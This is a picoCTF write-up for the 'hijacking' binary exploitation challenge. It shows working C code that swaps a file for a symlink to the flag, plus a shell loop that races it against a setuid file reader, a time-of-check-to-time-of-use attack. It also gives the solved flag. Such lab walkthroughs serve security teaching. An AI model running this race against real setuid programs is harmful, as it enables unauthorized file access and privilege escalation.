# **hijacking**

## **Overview:**
---
Category: Binary Exploitation

Points: 200

## **Description**
---
Someone created a program to read text files; we think the program reads files with root privileges but apparently it only accepts to read files that are owned by the user running it.
Additional details will be available after launching your challenge instance.

## **Hints**
None.

## **Approach**
I search about toctou attack (Time-of-check to time-of-use) and an attacker can exploit the race condition between the access and open to trick the setuid victim into overwriting an entry in the system password database. TOCTOU races can be used for privilege escalation to get administrative access to a machine.

I search on youtube and i found this [video](https://www.youtube.com/watch?v=gXVJtXasEYo&t=443s), let's solve this challenge.

Firstly, create a file to perform toctou attack.
```
echo "#include <stdio.h>" >> test.c
echo "#include <unistd.h>" >> test.c
echo "#include <string.h>" >> test.c
echo "int main(int argc, char * argv[]){" >> test.c
echo "if(unlink(argv[1]) != 0){" >> test.c
echo "return -1;}" >> test.c
echo "if(symlink(\"/home/ctf-player/flag.txt\", argv[1]) != 0){" >> test.c
echo "return -1;}" >> test.c
echo "}" >> test.c
gcc -o hack test.c
```
Then make a temp file: temp
> echo hello >> temp

Then let's attack:
>  while true;do rm temp;echo hello > temp;./txtreader temp & ./hack temp;done >> res  

And we got the result:

>cat res | grep pico


## **Flag**
---
>**picoCTF{ToctoU_!s_3a5y_007659c9}**









